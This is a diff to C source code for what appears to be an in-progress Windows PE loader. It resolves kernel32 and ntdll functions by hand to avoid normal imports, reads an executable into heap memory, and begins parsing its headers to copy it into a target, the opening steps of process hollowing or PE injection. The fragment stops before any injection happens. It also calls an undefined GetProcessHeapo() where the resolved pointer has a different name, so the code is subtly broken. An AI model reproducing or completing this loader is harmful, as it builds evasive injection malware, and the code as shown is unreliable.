@@ -189,25 +189,40 @@ int wmain()
 	
 	/*source file*/
 	_CreateFileA Createfil = find_function_address(kernel32_base,"CreateFileA");
-	HANDLE src = Createfil("C:\\Windows\\syswow64\\calc.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
-	
+	HANDLE src = Createfil("C:\\Users\\Slashroot\\Desktop\\PECmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	if (src==0xFFFFFFFF) {
+#ifdef DEBUG
+		printf("can't open file . bye !"); 
+#endif
+		return 0xDEADBEEF; 
+	}
 	_GetFileSize GetFilesiz = find_function_address(kernel32_base, "GetFileSize");
 	DWORD srcSize = GetFilesiz(src, NULL);
 	LPDWORD BytesRead = 0;
 	_RtlAllocateHeap RtlAllocateH = find_function_address(ntdll_base , "RtlAllocateHeap");
 #ifdef DEBUG
-	printf("[+] RtlAllocateHeap address @ %x\n", (DWORD)RtlAllocateH);
+	printf("[+] RtlAllocateHeap address @ 0x%x\n", (DWORD)RtlAllocateH);
 #endif
 	_GetProcessHeap GetProcessHea = find_function_address(kernel32_base, "GetProcessHeap");
 #ifdef DEBUG
-	printf("[+] GetProcessHea address @ %x\n", (DWORD)GetProcessHea);  
+	printf("[+] GetProcessHea address @ 0x%x\n", (DWORD)GetProcessHea);  
 #endif
 	HANDLE heappi= GetProcessHeapo(); 
 #ifdef DEBUG
-	printf("\n[+]address of Heapalloc = %x , another fucking address = %x", GetProcAddress(GetModuleHandleA("kernel32.dll"),"HeapAlloc"), RtlAllocateH);
+	printf("\n[+]address of RtlAllocateHeap = 0x%x\n",(DWORD)RtlAllocateH);
 #endif
 	LPVOID srcBuffer = RtlAllocateH(heappi, HEAP_ZERO_MEMORY, srcSize);
 	_ReadFile ReadFil = find_function_address(kernel32_base, "ReadFile");
 	ReadFil(src, srcBuffer, srcSize, NULL, NULL);
-	return 0; 
+	
+
+	/*copy to target*/
+		/*Allocate memory*/
+	PIMAGE_DOS_HEADER srcDosHeader = (PIMAGE_DOS_HEADER)srcBuffer; 
+	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
+	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
+#ifdef DEBUG	
+	printf("\n%x\n" ,srcImgSize); 
+#endif
+
 }
